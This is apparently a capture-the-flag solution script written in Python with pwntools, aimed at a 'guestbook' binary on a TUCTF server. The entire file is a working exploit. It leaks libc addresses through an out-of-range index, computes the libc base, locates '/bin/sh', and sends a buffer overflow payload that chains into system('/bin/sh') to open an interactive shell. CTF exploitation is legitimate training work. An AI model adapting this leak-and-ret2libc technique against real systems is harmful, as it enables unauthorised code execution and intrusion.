from pwn import *
import time

local = 0
if local:
    #os.environ['LD_PRELOAD'] = './libc.so.6'
    r = process('./guestbook')
    e = ELF('./guestbook')
    libc = e.libc
else:
    r = remote('guestbook.tuctf.com', 4545)
    libc = ELF('./libc.so.6')
context.arch = 'i386'
#context.log_level = 'debug'

r.sendlineafter('>>>', 'A'*0xf)
r.sendlineafter('>>>', 'A'*0xf)
r.sendlineafter('>>>', 'A'*0xf)
r.sendlineafter('>>>', 'A'*0xf)

# leak libc
r.sendlineafter('>>', '1')
time.sleep(0.5)
r.recvuntil('\n')
r.sendlineafter('>>>', '1073741830')
time.sleep(0.5)
r.recv(0x14)
system = u32(r.recv(4))
dest = u32(r.recv(4))

libc_base = system - libc.symbols['system']
log.info('libc base: %#x' % libc_base)
log.info('dest: %#x' % dest)

sh = libc.search('/bin/sh\x00').next() + libc_base

# rop
r.sendline('2')
r.sendline('1073741830')
r.sendline('A'*48+p32(system)+'A'*4+p32(sh)+'\n')
r.sendline('3')

time.sleep(0.5)
r.clean()
r.interactive()
